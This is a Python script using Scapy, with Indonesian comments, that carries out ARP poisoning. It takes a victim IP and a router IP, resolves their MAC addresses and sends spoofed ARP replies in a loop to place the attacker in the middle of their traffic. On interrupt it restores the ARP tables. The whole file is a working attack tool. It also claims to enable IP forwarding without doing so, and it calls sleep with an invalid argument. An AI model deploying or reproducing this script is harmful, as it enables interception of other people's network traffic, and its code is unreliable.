from scapy.all import *
import time
import sys
#untuk kita inputkan semuanya yang dibutuhkan utk arp poisoing
try:
	interface = input("[*] Input interface: ")
	victimIP = input("[*] Input Victim IP: ")
	gateIP = input("[*] Input Router IP: ")

except KeyboardInterrupt:
	print("[*] Exitting")
	sys.exit(1)

print("[*] Enabling IP Forwarding")

#Fungsi ini digunakan untuk mendapatkan mac address dari parameter IP address
def get_mac(IP):
	conf.verb = 0 
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),timeout=2,iface=interface,inter=0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%") #jika ada jawaban maka akan di terima lalu print

#Fungsi ini untuk mereset arp table nya, untuk menecegah kecurigaan dari server adanya duplicate (proses arp poisoning)
def reARP():
	print("[*] Restoring Targets")
	victim_mac = get_mac(victimIP)
	gate_mac = get_mac(gateIP)
	send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst= "ff:ff:ff:ff:ff:ff", hwsrc=victim_mac),count=4)
	send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst= "ff:ff:ff:ff:ff:ff", hwsrc=gate_mac),count=4)
	print("[*] Disabling IP Forwarding")
	print("[*] Shutting Down")
	sys.exit(1)

# Fungsi ini mengirim sebuah paket ARP reply ke masing-masing target dan bilang bahwa saya adalah dia. Dan kita menjadi mitmnya
def trick(victim_mac,gate_mac):
	send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=victim_mac))
	send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gate_mac))

#Fungsi inti dari semua (gabungan), proses semuanya disini
def mitm():
	#untuk mendapatkan mac address victim dan gateway, harus menggunakan try/except satu-satu
	try:
		victim_mac=get_mac(victimIP)
	except Exception:
		print("[!} Couldn't find victim mac address")
		print("[!] Exitting")
		sys.exit(1)

	try:
		gate_mac = get_mac(gateIP)
	except Exception:
		print("[!} Couldn't find router mac address")
		print("[!] Exitting")
		sys.exit(1)

	print("[*] Start poisoning target")

	while True:
		try:
			trick(victim_mac,gate_mac)
			time.sleep(1,5)
		except KeyboardInterrupt:
			reARP()
			break
mitm()
